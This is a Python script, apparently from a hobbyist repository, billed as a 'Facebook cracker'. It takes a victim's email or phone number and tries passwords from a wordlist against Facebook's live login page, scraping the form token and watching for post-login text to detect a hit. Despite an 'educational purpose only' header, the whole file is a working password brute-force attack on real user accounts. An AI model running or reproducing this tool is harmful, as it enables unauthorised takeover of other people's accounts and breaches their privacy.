#####################################################
#    author   :-  SHAIK AFRID                       #
#    github   :-  https://github.con/afridanon      #
#    twitter  :-  @afridanon                        #
#    purpose  :-  educational purpose only          #
#     @--- DONT TRY TO STEEL MY CODE Bitch ---@     #
#####################################################


import os
import os.path
import time
def dependencis():
    os.system("pip install requests BeautifulSoup4 wordlist colorama mechanize")
    os.system("clear")
    global Fore
    from colorama import Fore
    global requests
    global bs4
    global BeautifulSoup
    global sys
    import requests
    from bs4 import BeautifulSoup
    import sys
    from colorama import init
    init(autoreset=True)
def about():
    banner = """
╔═╗╔╗   ╔═╗╦═╗╔═╗╔═╗╦╔═╔═╗╦═╗
╠╣ ╠╩╗  ║  ╠╦╝╠═╣║  ╠╩╗║╣ ╠╦╝
╚  ╚═╝  ╚═╝╩╚═╩ ╩╚═╝╩ ╩╚═╝╩╚═ """
    print(Fore.RED + banner)
    print(Fore.YELLOW+"                     AUTHOR :-𝐒𝐇𝐀𝐈𝐊 𝐀𝐅𝐑𝐈𝐃")



PASSWORD_FILE = "passwords.txt"
MIN_PASSWORD_LENGTH = 6
POST_URL = 'https://www.facebook.com/login.php'
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}
PAYLOAD = {}
COOKIES = {}

def create_form():
    form = dict()
    cookies = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}
    data = requests.get(POST_URL, headers=HEADERS)
    for i in data.cookies:
        cookies[i.name] = i.value
    data = BeautifulSoup(data.text, 'html.parser').form
    if data.input['name'] == 'lsd':
        form['lsd'] = data.input['value']
    return form, cookies


def is_this_a_password(email, index, password):
    global PAYLOAD, COOKIES
    if index % 10 == 0:
        PAYLOAD, COOKIES = create_form()
        PAYLOAD['email'] = email
    PAYLOAD['pass'] = password
    r = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
    if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
        open('temp', 'w').write(str(r.content))
        print('\npassword found is: ', password)
        return True
    return False

if __name__ == "__main__":
    dependencis()
    about()
    print(Fore.YELLOW+"                     FACEBOOK CRACKER:-1.1.3")
    if not os.path.isfile(PASSWORD_FILE):
        print(Fore.GREEN+ "wordlist not exist in ur path:- ")
        PASSWORD_FILE = input(Fore.GREEN+"Enter The Path Of File:- ")
    password_data = open(PASSWORD_FILE, 'r').read().split("\n")
    email = input(Fore.BLUE+'Enter Email OR Phone Number Of Victim: ').strip()
    for index, password in zip(range(password_data.__len__()), password_data):
        password = password.strip()
        if len(password) < MIN_PASSWORD_LENGTH:
            continue
        print(Fore.RED+"TRYING PASSWORD  [", index, Fore.RED+"]: ", password)
        if is_this_a_password(email, index, password):
            break
        

